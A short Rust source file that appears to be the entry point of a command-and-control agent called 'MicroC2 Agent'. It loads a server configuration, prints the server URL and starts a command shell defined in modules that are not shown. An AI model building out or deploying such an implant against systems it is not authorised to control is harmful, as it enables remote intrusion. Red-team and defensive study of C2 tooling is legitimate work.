extern crate tokio;
extern crate hyper;
extern crate chrono;

mod file_handling;
mod commands;
mod config;

use commands::command_shell::start_command_shell;

#[tokio::main]
async fn main() {
    println!("MicroC2 Agent starting...");
    
    let config = config::ServerConfig::new();
    println!("Using server at: {}", config.url);
    
    let result = start_command_shell(config).await;
    if let Err(e) = result {
        eprintln!("Error running command shell: {}", e);
    }
}
